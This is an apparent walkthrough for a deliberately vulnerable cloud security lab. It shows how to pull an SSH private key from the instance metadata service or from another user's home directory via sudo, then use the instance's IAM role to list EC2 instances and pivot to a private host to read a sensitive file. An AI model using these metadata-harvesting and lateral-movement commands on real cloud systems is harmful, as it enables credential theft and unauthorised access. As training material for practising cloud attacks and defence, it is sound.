# Mission 2 cheat sheet


This mission is focused on using the metadata server.


  * Given: Instance ip, user and password
  * Variables: $id, $instance_ip


$ `ssh eviluser@$instance_ip`

Log into the instance to look around.


## Route 1: Use the metadata server to get the key

$ `curl 169.254.169.254/latest/user-data`

The SSH key is written using the startup script.


$ `vim ssh_key.pem; chmod 400 ssh_key.pem`

Write the key in a file and set the permissions for SSH to accept it.


## Route 2: Look around in the linux system to get the key

$ `sudo su`

The current user is sudoer.


$ `cd /home/ec2-user; chmod 400 SauerCloud-mission2-keypair-Evilcorp-Evilkeypair-$id`

The key is stored in the home dir.


## Once the SSH key is obtained

$ `aws --region us-east-1 ec2 describe-instances`

List the current instances using the instance's IAM role. The `--region us-east-1` parameter is required when using an EC2 instance's IAM role.


$ `ssh -i ssh_key.pem ec2-user@<private ip address of private instance>`

Log in to the second instance with no public ip address.


$ `cat ultra-sensitive-blueprints.txt`

You win!